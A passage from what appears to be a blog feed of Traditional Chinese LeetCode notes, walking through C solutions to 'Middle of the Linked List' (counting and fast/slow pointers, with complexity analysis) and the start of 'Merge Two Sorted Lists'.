        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找到鏈結串列的中間節點 | Easy |LeetCode#876 Middle of the Linked List</title>
      <link href="/posts/the_middle_of_the_list.html"/>
      <url>/posts/the_middle_of_the_list.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/876/question1.png"><br><img src="/img/LeetCode/876/question2.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個 single linked list 的 <code>head</code> 並且希望回傳 list 的中間節點，若中間節點有兩個，需要回傳第二個</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/876/algo.png"></p><ol><li>定義節點結構</li><li>建立 linked list</li><li>呼叫函數 <code>middleNode()</code></li></ol><p>在 <code>middleNode</code> 內:</p><ol><li>Traverse list，才有辦法知道中間節點，在 traverse過程透過一個counter來紀錄數量</li><li>判斷當前節點數量是奇數還是偶數，取得中間節點的 index </li><li>接著重新走訪到 middleNode，並回傳節點</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">middleNode</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">current</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">middle</span>=</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> middleNodeIndex;</span><br><span class="line">    <span class="type">bool</span> isEven;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Traverse to the middle node, and return middle node</span></span><br><span class="line">    current = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;counter; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( i == middleNodeIndex)&#123;</span><br><span class="line">            middle = current;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> middle;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>初始化變數:<ul><li><code>current</code> 用於遍歷鏈結串列，<code>middle</code> 用於儲存中間節點，<code>counter</code> 用於計算節點總數，<code>middleNodeIndex</code> 用於儲存中間節點的索引，<code>isEven</code> 用於判斷節點數是否為偶數</li></ul></li><li>計算list 長度跟中間索引:<ul><li>每走到一個節點就判斷基數偶數，並計算中間節點</li></ul></li><li>之後重新初始化 <code>current</code> 指標並traverse 到 <code>middleNodeIndex</code>的節點</li><li>返回中間節點</li></ul><h3 id="完整測試程式碼"><a href="#完整測試程式碼" class="headerlink" title="完整測試程式碼"></a>完整測試程式碼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">Node *first, *current, *previous;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node *first)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node *first)</span>;</span><br><span class="line">Node * <span class="title function_">middleNode</span><span class="params">(Node *first)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a 3-nodes linked list</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++) &#123;</span><br><span class="line">        Node *current = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">0</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">7</span>;</span><br><span class="line">            first = current;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">1</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">2</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">2</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">3</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            current-&gt;val = <span class="number">9</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PrintList(first);</span><br><span class="line">    Node *mid = middleNode(first);</span><br><span class="line">    <span class="keyword">if</span> (mid != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Middle Node: %d \n&quot;</span>, mid-&gt;val);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No middle node found.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FreeList(first);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node * ptr = first;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;empty list\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> ( ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt;&quot;</span>, ptr-&gt;val);</span><br><span class="line">            ptr = ptr -&gt; next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *tmp, *current;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        tmp = current;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node * <span class="title function_">middleNode</span><span class="params">(Node *first)</span>&#123;</span><br><span class="line">    Node *current = first;</span><br><span class="line">    Node *middle= <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> middleNodeIndex;</span><br><span class="line">    <span class="type">bool</span> isEven;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;counter; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( i == middleNodeIndex)&#123;</span><br><span class="line">            middle = current;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/876/results1.png"></p><blockquote><p>大概執行時間是 3ms，並不太算是效能良好的寫法<br>空間也用的挺多，5.66MB</p></blockquote><h2 id="修正程式碼"><a href="#修正程式碼" class="headerlink" title="修正程式碼"></a>修正程式碼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面這段程式碼有些冗，因為題目要求多個中間節點時，取第二個節點就好，因此奇偶數不用分開處理，可以改成下面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>執行結果也會大幅提升</p><p><img src="/img/LeetCode/876/results3.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><p>在解答區看到一個寫得很讚的作法，他的想法是:</p><ol><li>想像你跟你朋友正要爬樓梯</li><li>你們都站在樓梯底部</li><li>你每次爬一階，而你朋友每次爬兩階 (你的平均上樓速度會是你朋友的一半)</li><li>當他爬到頂端，你就停下 (恰好會待在樓梯的一半位置)</li></ol><h3 id="步驟"><a href="#步驟" class="headerlink" title="步驟"></a>步驟</h3><p><img src="/img/LeetCode/876/algo2.png"></p><ol><li><strong>Initialization:</strong> Start with two pointers, fast and slow, both pointing to the head of the list.</li><li><strong>Traversal:</strong> Move the fast pointer two steps at a time and the slow pointer one step at a time. This ensures that when the fast pointer reaches the end of the list, the slow pointer will be at the middle node.</li><li><strong>Find the Middle Node:</strong> After traversal, the slow pointer will be at the middle node of the list.</li><li><strong>Edge Case Handling:</strong> Check if the list is empty or contains only one node. In such cases, the middle node is the head itself.</li><li><strong>Return:</strong> Return the node pointed to by the slow pointer as the middle node.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">middleNode</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">fast_ptr</span>, *<span class="title">slw_ptr</span>;</span></span><br><span class="line">    fast_ptr = head;</span><br><span class="line">    slw_ptr = head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fast_ptr != <span class="literal">NULL</span> &amp;&amp; fast_ptr-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        fast_ptr = fast_ptr-&gt;next-&gt;next;</span><br><span class="line">        slw_ptr = slw_ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  slw_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/876/results2.png"></p><h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><h3 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><ul><li>在走訪整個 list 的時候間複雜度是 $O(N)$，N 為節點數量</li><li>接著在找尋中間節點時間複雜度同樣是 $O(N)$</li><li>整體而言，<code>middleNode</code> 函式的時間複雜度式 $O(N)+ O(N) &#x3D; O(N)$</li></ul><h3 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><p>空間消耗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct ListNode *current = head;</span><br><span class="line">struct ListNode *middle = NULL;</span><br><span class="line">int counter = 0;</span><br><span class="line">int middleNodeIndex;</span><br><span class="line">bool isEven;</span><br></pre></td></tr></table></figure><ul><li>為常數空間，因此這裡空間複雜度會是 $O(1)$</li><li>並且沒有使用額外的資料結構，所以整體而言空間複雜度也是 $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合併鏈結串列 | Easy | LeetCode#21 Merge Two Sorted Lists</title>
      <link href="/posts/8b576379.html"/>
      <url>/posts/8b576379.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/21/question1.png"><br><img src="/img/LeetCode/21/question2.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目描述: 給定兩個已排序 linked list 的 <code>head</code>，希望能夠合併成一個已排序的list</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/21/algo.jpg"></p><p>一開始我想說可以先走訪 <code>list1</code> 然後逐項比對 <code>list2</code> 的item，如果 <code>list1</code>中的元素小於 <code>list2</code> 的，就插入到 <code>list2</code>，並且插入後，再繼續迭代 <code>list1</code>當中的元素</p><p>原始代碼：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Node *ptr1, *ptr2, *previous, *preceding; </span><br><span class="line">ptr1 = list1;</span><br><span class="line">ptr2 = list2;</span><br><span class="line">preceding = ptr1;</span><br><span class="line">previous = ptr2;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Empty lists</span></span><br><span class="line"><span class="keyword">if</span>(ptr1==<span class="literal">NULL</span> &amp;&amp; ptr2==<span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="comment">//return empty list</span></span><br><span class="line">    <span class="keyword">return</span> ptr1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ptr1 == <span class="literal">NULL</span> )&#123;</span><br><span class="line">    <span class="keyword">return</span> ptr2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ptr2 == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> ptr1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (ptr1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span> (ptr2 !=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr1-&gt; val &lt;= ptr2-&gt;val)&#123;</span><br><span class="line">            preceding = ptr1-&gt;next;</span><br><span class="line">            ptr1-&gt;next = ptr2;</span><br><span class="line">            previous-&gt;next = ptr1;</span><br><span class="line">            previous = previous -&gt; next;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// //Tail Node</span></span><br><span class="line">            <span class="comment">// if ( (ptr1-&gt; val == ptr2-&gt;val) &amp;&amp; (ptr1-&gt;next == NULL))&#123;</span></span><br><span class="line">            <span class="comment">//     ptr2 -&gt; next = ptr1;</span></span><br><span class="line">            <span class="comment">//     break;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            previous = ptr2;</span><br><span class="line">            <span class="comment">//traverse list2</span></span><br><span class="line">            ptr2 = ptr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ptr1 = preceding;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list2;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但這種做法會在 <code>previous</code>, <code>preceding</code>更新指標時候會出問題，並且還需要額外判斷 Tail node，由於太過麻煩後續我就放棄這種做法</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">mergeTwoLists</span><span class="params">(<span class="keyword">struct</span> ListNode* list1, <span class="keyword">struct</span> ListNode* list2)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">ptr1</span>, *<span class="title">ptr2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  <span class="title">dummy</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">tail</span> =</span> &amp;dummy;</span><br><span class="line">    ptr1 = list1;</span><br><span class="line">    ptr2 = list2;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (ptr1 != <span class="literal">NULL</span> &amp;&amp; ptr2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr1-&gt;val &lt;= ptr2-&gt;val)&#123;</span><br><span class="line">            tail-&gt;next = ptr1;</span><br><span class="line">            ptr1 = ptr1-&gt;next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tail-&gt;next = ptr2;</span><br><span class="line">            ptr2 = ptr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        tail = tail -&gt; next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptr1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        tail-&gt;next = ptr1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ptr2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        tail-&gt;next = ptr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>我後面取而代之的是，建立新的 